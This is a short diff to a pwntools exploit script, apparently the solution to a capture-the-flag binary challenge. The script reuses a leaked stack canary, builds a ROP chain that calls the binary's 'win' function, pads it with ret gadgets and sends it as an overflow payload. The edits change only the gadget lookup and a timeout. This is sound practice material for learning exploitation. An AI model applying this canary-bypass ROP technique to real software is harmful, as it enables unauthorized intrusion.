@@ -32,7 +32,7 @@ canary_idx = canary_indices[0]
 rop = ROP(elf)
 rop.call(elf.sym.win, [123, 321])
 payload = list(leak)
-nop = pack(next(elf.search(asm("ret"))))
+nop = pack(rop.find_gadget(["ret"]).address)
 chain = rop.chain()
 for i in range(canary_idx + 1, (512 - len(chain)) // 8):
     chain = nop + chain
@@ -41,5 +41,5 @@ payload[(canary_idx + 1) * 8:] = chain
 io.sendlineafter(b"? ", b"w")
 io.sendlineafter(b"? ", b"512")
 io.send(bytes(payload))
-io.sendlineafter(b"? ", b"q")
+io.sendlineafter(b"? ", b"q", timeout=1)
 print(io.readall(timeout=1).decode().rstrip())
